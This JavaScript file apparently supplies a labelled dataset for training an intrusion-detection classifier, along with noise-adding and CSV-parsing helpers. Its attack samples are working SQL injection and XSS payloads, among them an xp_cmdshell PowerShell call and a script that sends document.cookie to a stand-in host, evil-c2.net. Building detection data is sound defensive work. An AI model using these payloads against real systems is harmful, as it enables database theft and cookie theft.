/**
 * Benchmark Cybersecurity Datasets and Live Attack Stream Generator
 */

import { extractPayloadFeatures } from './featureExtractor';

export const SAMPLE_BENCHMARKS = [
  // Normal Web Requests
  { payload: 'GET /index.html HTTP/1.1', label: 'NORMAL', ip: '192.168.1.45', port: 80 },
  { payload: 'GET /api/v1/products?category=electronics&page=1 HTTP/1.1', label: 'NORMAL', ip: '192.168.1.102', port: 443 },
  { payload: 'POST /auth/login HTTP/1.1 user=alice_smith&remember=true', label: 'NORMAL', ip: '10.0.0.15', port: 443 },
  { payload: 'GET /assets/style.css HTTP/1.1', label: 'NORMAL', ip: '192.168.1.77', port: 80 },
  { payload: 'POST /checkout/submit HTTP/1.1 {"cartId": 8921, "paymentMethod": "card"}', label: 'NORMAL', ip: '172.16.0.4', port: 443 },
  { payload: 'GET /users/profile?id=4920 HTTP/1.1', label: 'NORMAL', ip: '10.0.4.11', port: 443 },

  // SQL Injection Attacks
  { payload: "SELECT * FROM users WHERE username = 'admin' OR '1'='1' --", label: 'SQLI', ip: '45.33.32.156', port: 80 },
  { payload: "GET /search?q=test' UNION SELECT 1,username,password_hash,email FROM sys_users -- HTTP/1.1", label: 'SQLI', ip: '185.220.101.5', port: 443 },
  { payload: "POST /login HTTP/1.1 username=admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", label: 'SQLI', ip: '194.26.29.112', port: 443 },
  { payload: "GET /item.php?id=-1 OR 1=1 ORDER BY 1,2,3,4,5# HTTP/1.1", label: 'SQLI', ip: '45.154.255.89', port: 80 },
  { payload: "'; EXEC xp_cmdshell('powershell -enc JABh...')--", label: 'SQLI', ip: '193.32.162.201', port: 1433 },
  { payload: "SELECT schema_name FROM information_schema.schemata WHERE 'a'='a'", label: 'SQLI', ip: '91.240.118.172', port: 3306 },

  // XSS (Cross-Site Scripting) Attacks
  { payload: '<script>fetch("http://evil-c2.net/steal?c=" + document.cookie)</script>', label: 'XSS', ip: '103.145.13.2', port: 443 },
  { payload: '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))" />', label: 'XSS', ip: '178.62.204.101', port: 80 },
  { payload: 'GET /profile?name="><svg/onload=alert(document.domain)> HTTP/1.1', label: 'XSS', ip: '195.154.122.9', port: 443 },
  { payload: 'javascript:/*--></title></style></textarea></script><svg/onload=prompt(1)>', label: 'XSS', ip: '82.102.23.44', port: 80 },
  { payload: '<iframe src="javascript:alert(`XSS_COMPROMISE`)"></iframe>', label: 'XSS', ip: '104.244.78.3', port: 443 },

  // DDoS / Flood Spikes
  { payload: 'SYN_FLOOD_BURST: 85000 pkts/sec to Target VIP :443 (RST invalid)', label: 'DDOS', ip: '45.143.200.12', port: 443 },
  { payload: 'SLOWLORIS_THREAD_EXHAUSTION: Partial HTTP GET headers lingering 120s', label: 'DDOS', ip: '198.51.100.41', port: 80 },
  { payload: 'UDP_AMPLIFICATION_MEMCACHED: 50Gbps reflected traffic stream', label: 'DDOS', ip: '203.0.113.195', port: 11211 },
  { payload: 'HTTP_FLOOD_BOTNET: 12000 req/s to /api/heavy_compute from 500 IPs', label: 'DDOS', ip: '194.87.111.45', port: 443 },

  // Brute Force & Credential Stuffing
  { payload: 'POST /auth/login attempt=94 user=admin pass=123456 (Dictionary Match)', label: 'BRUTE_FORCE', ip: '93.184.220.29', port: 443 },
  { payload: 'SSH_BURST_TRY user=root pass=toor port=22 fail_count=182', label: 'BRUTE_FORCE', ip: '185.190.141.1', port: 22 },
  { payload: 'RDP_AUTH_STUFFING domain=CORP user=administrator count=420', label: 'BRUTE_FORCE', ip: '89.248.165.71', port: 3389 },

  // Data Exfiltration & Smuggling
  { payload: 'POST /upload.php?mode=stealth (Encrypted Base64 Payload 4.8MB sent to external IP)', label: 'EXFILTRATION', ip: '179.43.175.60', port: 8443 },
  { payload: 'DNS_TUNNEL_EXFIL: Base32 chunk "a4f891b0c.zone.exfil-dns.org" TXT query', label: 'EXFILTRATION', ip: '194.67.210.88', port: 53 },
  { payload: 'POST /v2/analytics body={"dump": "e1xzb21lX2FkbWluX2hhc2hfc3RlYWx9..."}', label: 'EXFILTRATION', ip: '185.220.102.8', port: 443 },

  // Reconnaissance & Port Scans
  { payload: 'TCP_SYN_SCAN sequential probe ports 21..1024 delta=0.2ms', label: 'PORT_SCAN', ip: '77.88.55.66', port: 21 },
  { payload: 'XMAS_SCAN flags=FIN,PSH,URG probing stealth response', label: 'PORT_SCAN', ip: '195.201.201.32', port: 445 },
  { payload: 'NMAP_OS_FINGERPRINT: probe sequence T1-T7 TCP options mismatch', label: 'PORT_SCAN', ip: '109.236.88.19', port: 8080 }
];

export function generateTrainingDataset(multiplier = 8) {
  const dataset = [];

  for (let m = 0; m < multiplier; m++) {
    SAMPLE_BENCHMARKS.forEach((sample, idx) => {
      // Add slight noise to feature vectors to simulate rich realistic distribution
      const noise = (Math.random() - 0.5) * 0.05;
      const feat = extractPayloadFeatures(sample.payload);
      
      const noisyVector = feat.featureVector.map(v => Math.min(Math.max(v + noise, 0), 1));

      dataset.push({
        id: `sample-${m}-${idx}`,
        payload: sample.payload,
        label: sample.label,
        ip: sample.ip,
        port: sample.port,
        vector: noisyVector,
        entropy: feat.entropy,
        specialRatio: feat.specialRatio,
        sqlKeywords: feat.sqlKeywordCount,
        xssPatterns: feat.xssPatternCount,
        timestamp: new Date(Date.now() - Math.random() * 3600000).toISOString()
      });
    });
  }

  return dataset;
}

export function parseCSVDataset(csvContent) {
  const lines = csvContent.trim().split('\n');
  if (lines.length < 2) return [];

  const headers = lines[0].split(',').map(h => h.trim().toLowerCase());
  const payloadIdx = headers.findIndex(h => h.includes('payload') || h.includes('query') || h.includes('request') || h.includes('text'));
  const labelIdx = headers.findIndex(h => h.includes('label') || h.includes('class') || h.includes('type') || h.includes('attack'));

  const parsed = [];

  for (let i = 1; i < lines.length; i++) {
    const row = lines[i].split(',');
    if (row.length < 2) continue;

    const payload = payloadIdx !== -1 ? row[payloadIdx] : row[0];
    const rawLabel = (labelIdx !== -1 ? row[labelIdx] : row[row.length - 1] || 'NORMAL').trim().toUpperCase();

    let label = 'NORMAL';
    if (rawLabel.includes('SQL') || rawLabel.includes('INJECT')) label = 'SQLI';
    else if (rawLabel.includes('XSS') || rawLabel.includes('SCRIPT')) label = 'XSS';
    else if (rawLabel.includes('DDOS') || rawLabel.includes('FLOOD') || rawLabel.includes('DOS')) label = 'DDOS';
    else if (rawLabel.includes('BRUTE') || rawLabel.includes('AUTH')) label = 'BRUTE_FORCE';
    else if (rawLabel.includes('EXFIL') || rawLabel.includes('MALWARE')) label = 'EXFILTRATION';
    else if (rawLabel.includes('SCAN') || rawLabel.includes('PROBE')) label = 'PORT_SCAN';

    const feat = extractPayloadFeatures(payload);

    parsed.push({
      id: `custom-${i}`,
      payload,
      label,
      ip: `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)+1}`,
      port: 443,
      vector: feat.featureVector,
      entropy: feat.entropy,
      specialRatio: feat.specialRatio,
      sqlKeywords: feat.sqlKeywordCount,
      xssPatterns: feat.xssPatternCount,
      timestamp: new Date().toISOString()
    });
  }

  return parsed;
}
